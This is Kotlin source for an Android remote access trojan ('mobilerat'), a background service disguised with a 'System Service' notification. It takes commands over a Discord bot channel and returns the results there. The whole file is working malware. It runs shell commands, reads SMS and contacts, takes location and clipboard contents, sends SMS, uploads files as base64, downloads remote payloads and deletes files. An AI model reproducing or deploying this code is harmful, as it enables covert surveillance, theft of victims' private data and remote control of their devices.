package com.kai.mobilerat

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class C2Service : Service() {

    private var running = true
    private var lastId = "0"
    private var me: String? = null
    private var cwd = "/sdcard"
    private var pollMs = (Config.POLL * 1000).toLong()

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotification())
        Thread { loop() }.start()
    }

    private fun buildNotification(): Notification {
        val channelId = "svc"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(NotificationChannel(channelId, "Service", NotificationManager.IMPORTANCE_LOW))
        }
        return Notification.Builder(this, channelId)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
    }

    private fun request(method: String, path: String, body: String? = null): String? {
        return try {
            val conn = URL(Config.API + path).openConnection() as HttpURLConnection
            conn.requestMethod = method
            conn.setRequestProperty("Authorization", "Bot " + Config.TOKEN)
            conn.setRequestProperty("User-Agent", "DiscordBot (https://discord.com/api, 10)")
            conn.connectTimeout = 10000
            conn.readTimeout = 45000
            if (body != null) {
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                OutputStreamWriter(conn.outputStream).use { it.write(body) }
            }
            val stream = if (conn.responseCode in 200..299) conn.inputStream else conn.errorStream
            val text = stream?.bufferedReader()?.readText() ?: ""
            if (text.isBlank()) null else text
        } catch (_: Exception) { null }
    }

    private fun prime(): Boolean {
        val meRes = request("GET", "/users/@me") ?: return false
        try { me = JSONObject(meRes).optString("id") } catch (_: Exception) { return false }
        val msgs = request("GET", "/channels/${Config.CHANNEL}/messages?limit=1") ?: return true
        try {
            val arr = JSONArray(msgs)
            lastId = if (arr.length() > 0) arr.getJSONObject(0).optString("id", "0") else "0"
        } catch (_: Exception) {}
        return true
    }

    private fun poll(): List<JSONObject> {
        val res = request("GET", "/channels/${Config.CHANNEL}/messages?limit=20&after=$lastId") ?: return emptyList()
        val list = mutableListOf<JSONObject>()
        val raw = try { JSONArray(res) } catch (_: Exception) { JSONArray() }
        for (i in 0 until raw.length()) {
            val m = raw.getJSONObject(i)
            val id = m.optString("id", lastId)
            val lastNum = lastId.toLongOrNull() ?: 0L
            val idNum = id.toLongOrNull() ?: 0L
            if (idNum > lastNum) lastId = id
            if (m.optJSONObject("author")?.optString("id") == me) continue
            list.add(m)
        }
        return list
    }

    private fun send(text: String) {
        val chunked = text.chunked(1900)
        for (c in chunked) {
            request("POST", "/channels/${Config.CHANNEL}/messages", JSONObject().put("content", "[${Config.ALIAS}] $c").toString())
            Thread.sleep(400)
        }
    }

    private fun handle(content: String) {
        val parts = content.trim().split(" ", limit = 2)
        val verb = parts.getOrNull(0)?.lowercase() ?: return
        val arg = parts.getOrNull(1) ?: ""
        when (verb) {
            "info" -> send("MODEL=${Build.MODEL} SDK=${Build.VERSION.SDK_INT} CWD=$cwd")
            "sh" -> {
                try {
                    val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", arg))
                    val out = p.inputStream.bufferedReader().readText()
                    val err = p.errorStream.bufferedReader().readText()
                    send((out + err).ifBlank { "(no output)" })
                } catch (e: Exception) { send("ERR ${e.message}") }
            }
            "cd" -> { cwd = arg; send("CWD=$cwd") }
            "ls" -> {
                val dir = java.io.File(if (arg.isBlank()) cwd else arg)
                val list = dir.listFiles()?.joinToString("\n") { (if (it.isDirectory) "[D] " else "[F] ") + it.name } ?: "(empty)"
                send(list)
            }
            "clip" -> {
                val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                if (arg.isBlank()) send(cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "(empty)")
                else { cm.setPrimaryClip(android.content.ClipData.newPlainText("x", arg)); send("CLIP_OK") }
            }
            "ps" -> {
                val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                send(am.runningAppProcesses?.joinToString("\n") { "${it.pid} ${it.processName}" } ?: "(none)")
            }
            "kill" -> {
                try { Runtime.getRuntime().exec(arrayOf("kill", arg)); send("KILL_OK") } catch (e: Exception) { send("ERR ${e.message}") }
            }
            "msg" -> send("MSG: $arg")
            "sleep" -> { pollMs = (arg.toLongOrNull() ?: 3) * 1000; send("SLEEP ${pollMs}ms") }
            "exit" -> { running = false; stopSelf() }
            "purge" -> { try { java.io.File(applicationInfo.dataDir).deleteRecursively(); stopSelf() } catch (_: Exception) {} }
            "loc" -> {
                val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                send("LOC ${loc?.latitude},${loc?.longitude}")
            }
            "sms" -> {
                val (num, msg) = arg.split("|", limit = 2)
                android.telephony.SmsManager.getDefault().sendTextMessage(num, null, msg, null, null)
                send("SMS_OK")
            }
            "smsread" -> {
                val cr = contentResolver.query(android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
                val sb = StringBuilder()
                var n = 0
                cr?.use { c ->
                    val ai = c.getColumnIndex("address"); val bi = c.getColumnIndex("body"); val di = c.getColumnIndex("date")
                    while (c.moveToNext() && n < 30) { sb.append(c.getString(ai)).append(": ").append(c.getString(bi)).append("\n"); n++ }
                }
                send(sb.toString().ifBlank { "(empty)" })
            }
            "contacts" -> {
                val cr = contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                val sb = StringBuilder()
                var n = 0
                cr?.use { c ->
                    val ni = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val pi = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext() && n < 200) { sb.append(c.getString(ni)).append(" ").append(c.getString(pi)).append("\n"); n++ }
                }
                send(sb.toString().ifBlank { "(empty)" })
            }
            "apps" -> {
                val pm = packageManager
                val list = pm.getInstalledApplications(0).map { it.loadLabel(pm).toString() }.sorted().joinToString("\n")
                send(list)
            }
            "rm" -> { try { java.io.File(arg).delete(); send("RM_OK") } catch (e: Exception) { send("ERR ${e.message}") } }
            "mv" -> {
                val p = arg.split(" ", limit = 2)
                try { java.io.File(p[0]).renameTo(java.io.File(p.getOrElse(1) { p[0] })); send("MV_OK") } catch (e: Exception) { send("ERR ${e.message}") }
            }
            "storage" -> {
                val f = java.io.File("/sdcard")
                send("FREE=${f.freeSpace} TOTAL=${f.totalSpace}")
            }
            "battery" -> {
                val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                send("BATT=${bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)}%")
            }
            "shot" -> {
                val p = "/sdcard/shot.png"
                try { Runtime.getRuntime().exec(arrayOf("screencap", "-p", p)).waitFor(); send("SHOT $p") } catch (e: Exception) { send("ERR ${e.message}") }
            }
            "dl" -> {
                try {
                    val f = java.io.File(arg)
                    val b64 = android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.NO_WRAP)
                    send("FILE ${f.name} $b64")
                } catch (e: Exception) { send("ERR ${e.message}") }
            }
            "up" -> {
                val parts2 = arg.split(" ", limit = 2)
                val url = parts2.getOrNull(0) ?: ""
                val dest = parts2.getOrNull(1) ?: "/sdcard/up.bin"
                try {
                    val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                    conn.inputStream.use { ins -> java.io.File(dest).outputStream().use { outs -> ins.copyTo(outs) } }
                    send("UP_OK $dest")
                } catch (e: Exception) { send("ERR ${e.message}") }
            }
            "gh" -> {
                // fetch payload from GitHub release/raw URL into /sdcard then report path
                val parts2 = arg.split(" ", limit = 2)
                val url = parts2.getOrNull(0) ?: ""
                val dest = parts2.getOrNull(1) ?: "/sdcard/gh.bin"
                try {
                    val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                    conn.inputStream.use { ins -> java.io.File(dest).outputStream().use { outs -> ins.copyTo(outs) } }
                    send("GH_OK $dest ${java.io.File(dest).length()}")
                } catch (e: Exception) { send("ERR ${e.message}") }
            }
            else -> send("UNKNOWN")
        }
    }

    private fun loop() {
        while (!prime()) Thread.sleep(5000)
        while (running) {
            try {
                for (m in poll()) handle(m.optString("content"))
                Thread.sleep(pollMs)
            } catch (_: Exception) {
                Thread.sleep(5000)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        super.onDestroy()
    }
}
